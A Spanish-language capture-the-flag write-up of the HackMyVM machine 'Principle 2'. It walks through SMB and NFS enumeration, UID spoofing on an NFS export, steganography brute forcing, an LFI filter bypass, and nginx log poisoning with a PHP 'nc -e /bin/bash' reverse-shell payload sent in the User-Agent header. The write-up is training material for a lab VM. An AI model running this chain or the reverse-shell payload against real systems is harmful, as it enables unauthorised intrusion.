---
layout: post
title: Principle 2
date: 2024-02-26
author: BlackCage
categories: [HackMyVM]
tags: [HMV, Enumeration, SMB, NFS, Steganography, LFI, Log Poisoning, RCE, Brute Force, Services, SUID]
---

# Principle 2 [ Hack My VM ]

<div class="embedtool">
  <iframe src="https://www.youtube.com/embed/1nXWloylcNU" frameborder="0" allowfullscreen></iframe>
</div>

## Reconocimiento

---
### NMAP
```
# Nmap 7.93 scan initiated Sun Feb 25 15:07:19 2024 as: nmap -sCV -p80,111,139,445,2049,37321,37965,42443,47663,58015 -oN targeted 192.168.1.118
Nmap scan report for 192.168.1.118
Host is up (0.00088s latency).

PORT      STATE SERVICE     VERSION
80/tcp    open  http        nginx 1.22.1
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: nginx/1.22.1
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      35017/tcp6  mountd
|   100005  1,2,3      37946/udp6  mountd
|   100005  1,2,3      42325/udp   mountd
|   100005  1,2,3      47663/tcp   mountd
|   100021  1,3,4      37085/udp6  nlockmgr
|   100021  1,3,4      37321/tcp   nlockmgr
|   100021  1,3,4      41505/tcp6  nlockmgr
|   100021  1,3,4      47189/udp   nlockmgr
|   100024  1          42443/tcp   status
|   100024  1          43630/udp   status
|   100024  1          47671/udp6  status
|   100024  1          54085/tcp6  status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
2049/tcp  open  nfs_acl     3 (RPC #100227)
37321/tcp open  nlockmgr    1-4 (RPC #100021)
37965/tcp open  mountd      1-3 (RPC #100005)
42443/tcp open  status      1 (RPC #100024)
47663/tcp open  mountd      1-3 (RPC #100005)
58015/tcp open  mountd      1-3 (RPC #100005)
MAC Address: 08:00:27:B8:C8:73 (Oracle VirtualBox virtual NIC)

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-02-25T20:07:46
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 25 15:07:52 2024 -- 1 IP address (1 host up) scanned in 32.83 seconds
```

Vemos varios puertos. Entre ellos los puertos: **`111`**, **`139`**, **`445`** y **`2049`**.

### Inspección
La web no nos dice nada. No hay contenido relevante. Pasemos a mirar un poco más allá. Para ello utilizaré la herramienta **`enum4linux`**, una herramienta que nos permite obtener información sobre **`Samba`**:

```shell
┌──(root㉿kali)-[~/…/VMs/HMV/Principle 2/nmap]
└─# enum4linux -a 192.168.1.118
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Feb 26 10:09:18 2024

 =========================================( Target Information )=========================================

Target ........... 192.168.1.118
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

[...]

 =======================================( Users on 192.168.1.118 )=======================================
                                                        
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: hermanubis       Name:   Desc:                                                          

user:[hermanubis] rid:[0x3e8]

 =================================( Share Enumeration on 192.168.1.118 )=================================

smbXcli_negprot_smb1_done: No compatible protocol selected by server.

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      New Jerusalem Public
        hermanubis      Disk      Hermanubis share
        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
Reconnecting with SMB1 for workgroup listing.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 192.168.1.118

//192.168.1.118/public  Mapping: OK Listing: OK Writing: N/A

 ==================( Users on 192.168.1.118 via RID cycling (RIDS: 500-550,1000-1050) )==================

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\talos (Local User)
S-1-22-1-1001 Unix User\byron (Local User)
S-1-22-1-1002 Unix User\hermanubis (Local User)
S-1-22-1-1003 Unix User\melville (Local User)

[...]
```

Vemos que, además de haber tres usuarios (**`talos`**, **`byron`** y **`hermanubis`**) hay una carpeta en el servidor **`SMB`** llamada **`Public`** a la cual podemos acceder. Veamos lo que hay en ella:

```shell
┌──(root㉿kali)-[~/…/VMs/HMV/Principle 2/nmap]
└─# smbclient //192.168.1.118/public
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Nov 28 06:57:45 2023
  ..                                  D        0  Sat Nov 25 11:19:40 2023
  new_era.txt                         N      158  Sun Nov 19 07:01:00 2023
  straton.txt                         N      718  Sun Nov 19 07:00:24 2023
  loyalty.txt                         N      931  Sun Nov 19 07:01:07 2023

                19962704 blocks of size 1024. 17209280 blocks available
smb: \>
```

Vemos tres ficheros, vamos a descargarnos todos y ver su contenido:

```shell
smb: \> get new_era.txt
getting file \new_era.txt of size 158 as new_era.txt (9.1 KiloBytes/sec) (average 9.1 KiloBytes/sec)
smb: \> get straton.txt
getting file \straton.txt of size 718 as straton.txt (43.8 KiloBytes/sec) (average 25.9 KiloBytes/sec)
smb: \> get loyalty.txt
getting file \loyalty.txt of size 931 as loyalty.txt (60.6 KiloBytes/sec) (average 36.8 KiloBytes/sec)
smb: \> exit
```

Veamos los contenidos de estos ficheros:

```
Yesterday there was a big change, new government, new mayor. All citizens were reassigned their tasks. For security, every user should change their password.
```

```
This fragment from Straton's On the Universe appears to have been of great significance both to the Progenitor and to the Founder.

AMYNTAS:        But what does this tell us about the nature of the universe, which is what we were discussing?
STRATON:        That is the next question we must undertake to answer. We begin with the self because that is what determines our existence as individuals; but the self cannot exist without that which surrounds it. The citizen lives within the city; and the city lives within the cosmos. So now we must apply the principle we have discovered to the wider world, and ask: if man is like a machine, could it be that the universe is similar in nature? And if so, what follows from that fact?
```

```
This text was the source of considerable controversy in a debate between Byron (7) and Hermanubis (452).

What I propose, then, is that we are not born as entirely free agents, responsible only for ourselves. The very core of what we are, our sentience, separates us from and elevates us above the animal kingdom. As I have argued, this is not a matter of arrogance, but of responsibility.

2257686f2061726520796f752c207468656e3f22

To put it simply: each of us owes a burden of loyalty to humanity itself, to the human project across time and space. This is not a minor matter, or some abstract issue for philosophers. It is a profound and significant part of every human life. It is a universal source of meaning and insight that can bind us together and set us on a path for a brighter future; and it is also a division, a line that must held against those who preach the gospel of self-annihilation. We ignore it at our peril.
```

Como podemos ver, no hay nada interesante. Es una pérdida de tiempo. Por desgracia no siempre tendremos lo que nos interesa a la primera.

Pasemos a nuestra última opción: ver el contenido del servidor **`NFS`**. Para ello utilizaremos la herramienta **`showmount`**, una herramienta que nos permitirá ver si hay algún directorio disponible para poder montar remotamente:

```shell
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Principle 2]
└─# showmount -e 192.168.1.118      
Export list for 192.168.1.118:
/var/backups *
/home/byron  *
```

¡Qué bien! Tenemos dos monturas. Una llamada **`backups`** y la otra parece ser el directorio personal de **`Byron`**. Montemos primero la carpeta personal de **`Byron`**:

Primero crearemos la carpeta, en mi caso lo haré sobre el directorio **`/mnt/`{: .filepath }**:

```shell
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Principle 2]
└─# mkdir /mnt/byron
```

Una vez creada, podemos pasar a la montura:

```shell
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Principle 2]
└─# mount -t nfs 192.168.1.118:/home/byron /mnt/byron/
```

¡Bien, ya está montada! Pasemos a ver su contenido:

```shell
┌──(root㉿kali)-[/mnt/byron]
└─# ls -la
total 32
drwxr-xr-x 3 1001 test 4096 Nov 25 12:33 .
drwxr-xr-x 3 root root 4096 Feb 26 10:24 ..
lrwxrwxrwx 1 root root    9 Nov 25 12:33 .bash_history -> /dev/null
-rw-r--r-- 1 1001 test  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 1001 test 3526 Apr 23  2023 .bashrc
drwxr-xr-x 3 1001 test 4096 Nov 23 07:13 .local
-rw-r--r-- 1 1001 test  114 Nov 19 18:55 mayor.txt
-rw-r--r-- 1 1001 test  219 Nov 23 07:22 memory.txt
-rw-r--r-- 1 1001 test  807 Apr 23  2023 .profile
```

Vemos dos ficheros, el más importante es **`memory.txt`**. Veamos su contenido:

```
Hermanubis told me that he lost his password and couldn't change it, thank goodness I keep a record of each neighbor with their number and password in hexadecimal. I think he would be a good mayor of the New Jerusalem.
```

Nos dice que el usuario **`Hermanubis`** ha perdido la contraseña y que no puede cambiarla. Por suerte, **`Byron`**, guarda las contraseñas en hexadecimal. Por el momento no sabemos a lo que se refiere, así que pasemos a ver la otra montura:

```shell
┌──(root㉿kali)-[/mnt/byron]
└─# mkdir /mnt/backups
```

```shell
┌──(root㉿kali)-[/mnt]
└─# mount -t nfs 192.168.1.118:/var/backups /mnt/backups/
```

Tratemos de entrar a la nueva montura creada:

```shell
┌──(root㉿kali)-[/mnt]
└─# cd backups 
cd: permission denied: backups
```

Vaya, no podemos entrar. Es normal, no somos los dueños de la carpeta, aunque nos podemos hacer dueños de la carpeta con bastante simpleza. Primero miraremos cómo se llama el dueño de la carpeta:

```shell
┌──(root㉿kali)-[/mnt]
└─# ls -la
total 44
drwxr-xr-x  4 root root    4096 Feb 26 18:56 .
drwxr-xr-x 18 root root    4096 Mar  6  2023 ..
drwxr--r--  2   54 backup 28672 Nov 28 19:00 backups
drwxr-xr-x  3 1001 test    4096 Nov 25 12:33 byron
```

Vemos que el dueño del directorio **`backups`** lo tiene un usuario con la **`ID`** **`54`**. Para acceder a esta carpeta podemos crear un usuario que tenga la **`ID`** **`54`**, para ello utilizaremos el comando **`useradd`**:

```shell
┌──(root㉿kali)-[/mnt]
└─# useradd -u 54 hmv   
useradd warning: hmv's uid 54 outside of the UID_MIN 1000 and UID_MAX 60000 range.
```

¡Bien, ahora iniciemos sesión como **`hmv`** y veamos lo que hay dentro!

```shell
┌──(root㉿kali)-[/mnt]
└─# su hmv
hmv@kali:/mnt$
```

```shell
hmv@kali:/mnt/backups$ ls
0.txt     171.txt  243.txt  315.txt  388.txt  45.txt   531.txt  603.txt  676.txt  748.txt  81.txt   892.txt  964.txt
1000.txt  172.txt  244.txt  316.txt  389.txt  460.txt  532.txt  604.txt  677.txt  749.txt  820.txt  893.txt  965.txt
100.txt   173.txt  245.txt  317.txt  38.txt   461.txt  533.txt  605.txt  678.txt  74.txt   821.txt  894.txt  966.txt
101.txt   174.txt  246.txt  318.txt  390.txt  462.txt  534.txt  606.txt  679.txt  750.txt  822.txt  895.txt  967.txt
102.txt   175.txt  247.txt  319.txt  391.txt  463.txt  535.txt  607.txt  67.txt   751.txt  823.txt  896.txt  968.txt
103.txt   176.txt  248.txt  31.txt   392.txt  464.txt  536.txt  608.txt  680.txt  752.txt  824.txt  897.txt  969.txt
104.txt   177.txt  249.txt  320.txt  393.txt  465.txt  537.txt  609.txt  681.txt  753.txt  825.txt  898.txt  96.txt
105.txt   178.txt  24.txt   321.txt  394.txt  466.txt  538.txt  60.txt   682.txt  754.txt  826.txt  899.txt  970.txt
106.txt   179.txt  250.txt  322.txt  395.txt  467.txt  539.txt  610.txt  683.txt  755.txt  827.txt  89.txt   971.txt
107.txt   17.txt   251.txt  323.txt  396.txt  468.txt  53.txt   611.txt  684.txt  756.txt  828.txt  8.txt    972.txt
108.txt   180.txt  252.txt  324.txt  397.txt  469.txt  540.txt  612.txt  685.txt  757.txt  829.txt  900.txt  973.txt
109.txt   181.txt  253.txt  325.txt  398.txt  46.txt   541.txt  613.txt  686.txt  758.txt  82.txt   901.txt  974.txt
10.txt    182.txt  254.txt  326.txt  399.txt  470.txt  542.txt  614.txt  687.txt  759.txt  830.txt  902.txt  975.txt
110.txt   183.txt  255.txt  327.txt  39.txt   471.txt  543.txt  615.txt  688.txt  75.txt   831.txt  903.txt  976.txt
111.txt   184.txt  256.txt  328.txt  3.txt    472.txt  544.txt  616.txt  689.txt  760.txt  832.txt  904.txt  977.txt
112.txt   185.txt  257.txt  329.txt  400.txt  473.txt  545.txt  617.txt  68.txt   761.txt  833.txt  905.txt  978.txt
113.txt   186.txt  258.txt  32.txt   401.txt  474.txt  546.txt  618.txt  690.txt  762.txt  834.txt  906.txt  979.txt
114.txt   187.txt  259.txt  330.txt  402.txt  475.txt  547.txt  619.txt  691.txt  763.txt  835.txt  907.txt  97.txt
115.txt   188.txt  25.txt   331.txt  403.txt  476.txt  548.txt  61.txt   692.txt  764.txt  836.txt  908.txt  980.txt
116.txt   189.txt  260.txt  332.txt  404.txt  477.txt  549.txt  620.txt  693.txt  765.txt  837.txt  909.txt  981.txt
117.txt   18.txt   261.txt  333.txt  405.txt  478.txt  54.txt   621.txt  694.txt  766.txt  838.txt  90.txt   982.txt
118.txt   190.txt  262.txt  334.txt  406.txt  479.txt  550.txt  622.txt  695.txt  767.txt  839.txt  910.txt  983.txt
119.txt   191.txt  263.txt  335.txt  407.txt  47.txt   551.txt  623.txt  696.txt  768.txt  83.txt   911.txt  984.txt
11.txt    192.txt  264.txt  336.txt  408.txt  480.txt  552.txt  624.txt  697.txt  769.txt  840.txt  912.txt  985.txt
120.txt   193.txt  265.txt  337.txt  409.txt  481.txt  553.txt  625.txt  698.txt  76.txt   841.txt  913.txt  986.txt
121.txt   194.txt  266.txt  338.txt  40.txt   482.txt  554.txt  626.txt  699.txt  770.txt  842.txt  914.txt  987.txt
122.txt   195.txt  267.txt  339.txt  410.txt  483.txt  555.txt  627.txt  69.txt   771.txt  843.txt  915.txt  988.txt
123.txt   196.txt  268.txt  33.txt   411.txt  484.txt  556.txt  628.txt  6.txt    772.txt  844.txt  916.txt  989.txt
124.txt   197.txt  269.txt  340.txt  412.txt  485.txt  557.txt  629.txt  700.txt  773.txt  845.txt  917.txt  98.txt
125.txt   198.txt  26.txt   341.txt  413.txt  486.txt  558.txt  62.txt   701.txt  774.txt  846.txt  918.txt  990.txt
126.txt   199.txt  270.txt  342.txt  414.txt  487.txt  559.txt  630.txt  702.txt  775.txt  847.txt  919.txt  991.txt
127.txt   19.txt   271.txt  343.txt  415.txt  488.txt  55.txt   631.txt  703.txt  776.txt  848.txt  91.txt   992.txt
128.txt   1.txt    272.txt  344.txt  416.txt  489.txt  560.txt  632.txt  704.txt  777.txt  849.txt  920.txt  993.txt
129.txt   200.txt  273.txt  345.txt  417.txt  48.txt   561.txt  633.txt  705.txt  778.txt  84.txt   921.txt  994.txt
12.txt    201.txt  274.txt  346.txt  418.txt  490.txt  562.txt  634.txt  706.txt  779.txt  850.txt  922.txt  995.txt
130.txt   202.txt  275.txt  347.txt  419.txt  491.txt  563.txt  635.txt  707.txt  77.txt   851.txt  923.txt  996.txt
131.txt   203.txt  276.txt  348.txt  41.txt   492.txt  564.txt  636.txt  708.txt  780.txt  852.txt  924.txt  997.txt
132.txt   204.txt  277.txt  349.txt  420.txt  493.txt  565.txt  637.txt  709.txt  781.txt  853.txt  925.txt  998.txt
133.txt   205.txt  278.txt  34.txt   421.txt  494.txt  566.txt  638.txt  70.txt   782.txt  854.txt  926.txt  999.txt
134.txt   206.txt  279.txt  350.txt  422.txt  495.txt  567.txt  639.txt  710.txt  783.txt  855.txt  927.txt  99.txt
135.txt   207.txt  27.txt   351.txt  423.txt  496.txt  568.txt  63.txt   711.txt  784.txt  856.txt  928.txt  9.txt
136.txt   208.txt  280.txt  352.txt  424.txt  497.txt  569.txt  640.txt  712.txt  785.txt  857.txt  929.txt  alternatives.tar.0
137.txt   209.txt  281.txt  353.txt  425.txt  498.txt  56.txt   641.txt  713.txt  786.txt  858.txt  92.txt   apt.extended_states.0
138.txt   20.txt   282.txt  354.txt  426.txt  499.txt  570.txt  642.txt  714.txt  787.txt  859.txt  930.txt  apt.extended_states.1.gz
139.txt   210.txt  283.txt  355.txt  427.txt  49.txt   571.txt  643.txt  715.txt  788.txt  85.txt   931.txt  apt.extended_states.2.gz
13.txt    211.txt  284.txt  356.txt  428.txt  4.txt    572.txt  644.txt  716.txt  789.txt  860.txt  932.txt  apt.extended_states.3.gz
140.txt   212.txt  285.txt  357.txt  429.txt  500.txt  573.txt  645.txt  717.txt  78.txt   861.txt  933.txt  apt.extended_states.4.gz
141.txt   213.txt  286.txt  358.txt  42.txt   501.txt  574.txt  646.txt  718.txt  790.txt  862.txt  934.txt  apt.extended_states.5.gz
142.txt   214.txt  287.txt  359.txt  430.txt  502.txt  575.txt  647.txt  719.txt  791.txt  863.txt  935.txt  apt.extended_states.6.gz
143.txt   215.txt  288.txt  35.txt   431.txt  503.txt  576.txt  648.txt  71.txt   792.txt  864.txt  936.txt  dpkg.arch.0
144.txt   216.txt  289.txt  360.txt  432.txt  504.txt  577.txt  649.txt  720.txt  793.txt  865.txt  937.txt  dpkg.arch.1.gz
145.txt   217.txt  28.txt   361.txt  433.txt  505.txt  578.txt  64.txt   721.txt  794.txt  866.txt  938.txt  dpkg.arch.2.gz
146.txt   218.txt  290.txt  362.txt  434.txt  506.txt  579.txt  650.txt  722.txt  795.txt  867.txt  939.txt  dpkg.arch.3.gz
147.txt   219.txt  291.txt  363.txt  435.txt  507.txt  57.txt   651.txt  723.txt  796.txt  868.txt  93.txt   dpkg.arch.4.gz
148.txt   21.txt   292.txt  364.txt  436.txt  508.txt  580.txt  652.txt  724.txt  797.txt  869.txt  940.txt  dpkg.arch.5.gz
149.txt   220.txt  293.txt  365.txt  437.txt  509.txt  581.txt  653.txt  725.txt  798.txt  86.txt   941.txt  dpkg.diversions.0
14.txt    221.txt  294.txt  366.txt  438.txt  50.txt   582.txt  654.txt  726.txt  799.txt  870.txt  942.txt  dpkg.diversions.1.gz
150.txt   222.txt  295.txt  367.txt  439.txt  510.txt  583.txt  655.txt  727.txt  79.txt   871.txt  943.txt  dpkg.diversions.2.gz
151.txt   223.txt  296.txt  368.txt  43.txt   511.txt  584.txt  656.txt  728.txt  7.txt    872.txt  944.txt  dpkg.diversions.3.gz
152.txt   224.txt  297.txt  369.txt  440.txt  512.txt  585.txt  657.txt  729.txt  800.txt  873.txt  945.txt  dpkg.diversions.4.gz
153.txt   225.txt  298.txt  36.txt   441.txt  513.txt  586.txt  658.txt  72.txt   801.txt  874.txt  946.txt  dpkg.diversions.5.gz
154.txt   226.txt  299.txt  370.txt  442.txt  514.txt  587.txt  659.txt  730.txt  802.txt  875.txt  947.txt  dpkg.statoverride.0
155.txt   227.txt  29.txt   371.txt  443.txt  515.txt  588.txt  65.txt   731.txt  803.txt  876.txt  948.txt  dpkg.statoverride.1.gz
156.txt   228.txt  2.txt    372.txt  444.txt  516.txt  589.txt  660.txt  732.txt  804.txt  877.txt  949.txt  dpkg.statoverride.2.gz
157.txt   229.txt  300.txt  373.txt  445.txt  517.txt  58.txt   661.txt  733.txt  805.txt  878.txt  94.txt   dpkg.statoverride.3.gz
158.txt   22.txt   301.txt  374.txt  446.txt  518.txt  590.txt  662.txt  734.txt  806.txt  879.txt  950.txt  dpkg.statoverride.4.gz
159.txt   230.txt  302.txt  375.txt  447.txt  519.txt  591.txt  663.txt  735.txt  807.txt  87.txt   951.txt  dpkg.statoverride.5.gz
15.txt    231.txt  303.txt  376.txt  448.txt  51.txt   592.txt  664.txt  736.txt  808.txt  880.txt  952.txt  dpkg.status.0
160.txt   232.txt  304.txt  377.txt  449.txt  520.txt  593.txt  665.txt  737.txt  809.txt  881.txt  953.txt  dpkg.status.1.gz
161.txt   233.txt  305.txt  378.txt  44.txt   521.txt  594.txt  666.txt  738.txt  80.txt   882.txt  954.txt  dpkg.status.2.gz
162.txt   234.txt  306.txt  379.txt  450.txt  522.txt  595.txt  667.txt  739.txt  810.txt  883.txt  955.txt  dpkg.status.3.gz
163.txt   235.txt  307.txt  37.txt   451.txt  523.txt  596.txt  668.txt  73.txt   811.txt  884.txt  956.txt  dpkg.status.4.gz
164.txt   236.txt  308.txt  380.txt  452.txt  524.txt  597.txt  669.txt  740.txt  812.txt  885.txt  957.txt  dpkg.status.5.gz
165.txt   237.txt  309.txt  381.txt  453.txt  525.txt  598.txt  66.txt   741.txt  813.txt  886.txt  958.txt
166.txt   238.txt  30.txt   382.txt  454.txt  526.txt  599.txt  670.txt  742.txt  814.txt  887.txt  959.txt
167.txt   239.txt  310.txt  383.txt  455.txt  527.txt  59.txt   671.txt  743.txt  815.txt  888.txt  95.txt
168.txt   23.txt   311.txt  384.txt  456.txt  528.txt  5.txt    672.txt  744.txt  816.txt  889.txt  960.txt
169.txt   240.txt  312.txt  385.txt  457.txt  529.txt  600.txt  673.txt  745.txt  817.txt  88.txt   961.txt
16.txt    241.txt  313.txt  386.txt  458.txt  52.txt   601.txt  674.txt  746.txt  818.txt  890.txt  962.txt
170.txt   242.txt  314.txt  387.txt  459.txt  530.txt  602.txt  675.txt  747.txt  819.txt  891.txt  963.txt
hmv@kali:/mnt/backups$
```

¡Wow, hay demasiados documentos! Veamos cómo son por dentro:

```
4a1093b9180a89e5808f40cfdf235e5e
```

Son todos así y hay muchos pero no pasa nada, podemos poner todos estos ficheros en uno y llevarlo a nuestro directorio:

```shell
hmv@kali:/mnt/backups$ sudo cat *.txt > "/root/Desktop/VMs/HMV/Principle 2/content/all.txt"
```

Una vez hayamos pasado todos los documentos de texto a uno y lo tengamos en nuestra máquina, podemos pasar al siguiente paso: descubrir la contraseña de **`Hermanubis`**.

Tal y como nos decía la nota, la contraseña se encuentra aquí, pero está en **`hexadecimal`**. Por suerte podemos revertir el proceso de una manera muy sencilla:

```shell
┌──(root㉿kali)-[~/…/VMs/HMV/Principle 2/content]
└─# while read p; do echo "$p" | xxd -ps -r | strings; done < all.txt
[...]
ByronIsAsshole
```

Tras ejecutar esto veremos muchas líneas que no significan nada, pero entre ellas veremos una que sí tiene sentido. Esta línea es la única así, por lo que podemos asumir que se trata de la contraseña de **`Hermanubis`**.

¿Recordáis lo que **`enum4linux`** nos enumeró? Pues aunque en un principio no sirviera de nada, ahora sí nos va a hacer falta.

Nos dijo que en el servidor **`SMB`** había un usuario y una carpeta con el nombre de **`Hermanubis`**, nos decía que no podíamos ver esa carpeta por falta de permisos, pero ahora disponemos de una contraseña. Veamos si funciona, para ello utilizaré la herramienta **`SMBMap`**, la cual nos permitirá ver los permisos de los directorios:

```shell
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Principle 2]
└─# smbmap -H 192.168.1.118 -u hermanubis -p ByronIsAsshole
[+] IP: 192.168.1.118:445       Name: thetruthoftalos.hmv                               
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        public                                                  READ ONLY       New Jerusalem Public
        hermanubis                                              READ ONLY       Hermanubis share
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.17.12-Debian)
```

¡Qué bien! Ahora podemos ver el contenido de la carpeta **`hermanubis`** sin ningún problema. Veamos lo que contiene:

```shell
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Principle 2]
└─# smbclient //192.168.1.118/hermanubis -U hermanubis
Password for [WORKGROUP\hermanubis]: ByronIsAsshole
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Nov 28 09:44:44 2023
  ..                                  D        0  Tue Nov 28 20:13:50 2023
  index.html                          N      346  Tue Nov 28 09:44:41 2023
  prometheus.jpg                      N   307344  Tue Nov 28 12:23:24 2023

                19962704 blocks of size 1024. 17201084 blocks available
smb: \>
```

Hay dos archivos, pero os adelanto que solamente necesitaremos la foto, así que nos la descargamos:

```shell
smb: \> get prometheus.jpg
getting file \prometheus.jpg of size 307344 as prometheus.jpg (12505.8 KiloBytes/sec) (average 12505.9 KiloBytes/sec)
smb: \> exit
```

En la imagen como tal no vemos nada raro, pero no siempre va a estar a la vista. Tratemos de utilizar la herramienta **`StegSeek`** para hacer **`fuerza bruta`** sobre la imagen y ver si hay algo escondido:

```shell
┌──(root㉿kali)-[~/…/VMs/HMV/Principle 2/content]
└─# stegseek prometheus.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "soldierofanubis"   
[i] Original filename: "secret.txt".
[i] Extracting to "prometheus.jpg.out".
```

¡Ostras, parece ser que sí había algo oculto! Veamos el contenido que nos ha dejado:

```
I have set up a website to dismantle all the lies they tell us about the city: thetruthoftalos.hmv
```

El texto no importa, lo que importa es que hay un dominio. Añadamos este dominio al fichero **`/etc/hosts`{: .filepath }**:

```
# VMs
192.168.1.118   thetruthoftalos.hmv
```

## Movimiento Lateral

---
### Shell
Una vez hayamos añadido el dominio, podemos pasar a ver la web:

![Index](/assets/img/imgs/principle2/index.png)

Pues vaya, me esperaba algo más. No pasa nada, es el momento de utilizar la herramienta **`GoBuster`** para descubrir ficheros o directorios ocultos:

```shell
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Principle 2]
└─# gobuster dir -u "http://thetruthoftalos.hmv/" -w /usr/share/wordlists/external/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x html,php,txt -b 404,503
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://thetruthoftalos.hmv/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/external/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   503,404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
2024/02/26 19:41:07 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 8]
/index.php            (Status: 200) [Size: 1970]
```

Vemos dos índices, uno en **`HTML`** y el otro en **`PHP`**. Supongo que el que hemos visto era el **`HTML`**, así que veamos cómo luce el **`PHP`**:

![Index PHP](/assets/img/imgs/principle2/php_index.png)

Esto es otra cosa. Vemos que podemos abrir ficheros que tengan el nombre de un Dios, pero no es así.

Tras estar un rato probando pude llegar a ver ficheros del sistema. Es una vulnerabilidad bastante común. Se llama **`Directory Path Traversal`** y trata de irnos hacia atrás (**`../`**) para ver ficheros de la propia máquina.

De la mano va la vulnerabilidad **`Local File Inclusion`** (**`LFI`**) que junto con **`Directory Path Traversal`** podemos llegar a obtener una **`Reverse Shell`**.

Es muy fácil de explotar, hay formas de pasar según qué filtros. En este caso la web estaba eliminando este patrón: **`../`**. Aún así se puede explotar muy fácil, si solamente elimina esa parte podemos hacer lo siguiente: **`....//`**

¿Por qué? Bastante fácil, está eliminando solamente dos puntos y una barra lateral, pero sigue dejando la parte restante, es decir: **`../`**. Una vez sabemos cómo funciona, tratemos de ver el contenido del fichero **`/etc/passwd`{: .filepath }**:

```
http://thetruthoftalos.hmv/index.php?filename=....//....//....//....//....//....//....//....//....//....//....//etc/passwd
```

![ETC PASSWD](/assets/img/imgs/principle2/etc_passwd.png)

¡Hurra, vemos que funciona! Ahora podemos tratar de obtener una **`Reverse Shell`** gracias a otra vulnerabilidad llamda **`Log Poisoning`**.

Esta vulnerabilidad es muy fácil de explotar, simplemente enviaremos una solicitud a la web con el **`User-Agent`** modificado por un pequeño **`script`** en **`PHP`**, este, una vez carguemos el fichero, se ejecutará.

Vamos a mandar la petición con el **`User-Agent`** modificado:

```shell
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Principle 2]
└─# curl http://thetruthoftalos.hmv/REVERSE_SHELL -H "User-Agent: <?php exec('nc -e /bin/bash 192.168.1.103 4444')  ?>"
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.22.1</center>
</body>
</html>
```

Este pequeño **`script`** en **`PHP`**, una vez ejecutado, lanzará una **`Reverse Shell`** a nuestra máquina, permitiéndonos así la entrada a la máquina.

Antes de cargar el recurso vamos a ponernos en escucha. En mi caso lo haré por el puerto **`4444`** ya que así lo puse en la petición:

```shell
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Principle 2]
└─# nc -nlvp 4444  
listening on [any] 4444 ...
```

Ahora sí, podemos cargar el recurso simplemente accediento a esta **`URL`**:

```
http://thetruthoftalos.hmv/index.php?filename=....//....//....//....//....//....//....//....//....//....//....//var/log/nginx/access.log
```

Justo entremos nos entablará la conexión:

```shell
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Principle 2]
└─# nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.1.103] from (UNKNOWN) [192.168.1.118] 55138
www-data@principle2:~/thetruthoftalos.hmv$
```

¡Qué bien, estamos en la máquina como **`www-data`**! Ahora debemos iniciar sesión como **`Hermanubis`** utilizando la contraseña antes encontrada:

```shell
www-data@principle2:~/thetruthoftalos.hmv$ su hermanubis
Password: ByronIsAsshole
hermanubis@principle2:/var/www/thetruthoftalos.hmv$
```

### Subida de privilegios #1
Ahora que estamos en la máquina como **`Hermanubis`** tenemos que encontrar la manera de escalar privilegios para así tratar de obtener el **`control total`** de la máquina.

Para comenzar listé el contenido del directorio personal de **`Hermanubis`**:

```shell
hermanubis@principle2:~$ ls -la
total 32
drwx------ 3 hermanubis hermanubis 4096 Nov 29 01:13 .
drwxr-xr-x 7 root       root       4096 Nov 25 16:19 ..
lrwxrwxrwx 1 root       root          9 Nov 25 17:34 .bash_history -> /dev/null
-rwx------ 1 hermanubis hermanubis  220 Apr 23  2023 .bash_logout
-rwx------ 1 hermanubis hermanubis 3526 Apr 23  2023 .bashrc
-rwx------ 1 hermanubis hermanubis  264 Nov 23 21:18 investigation.txt
-rwx------ 1 hermanubis hermanubis  807 Apr 23  2023 .profile
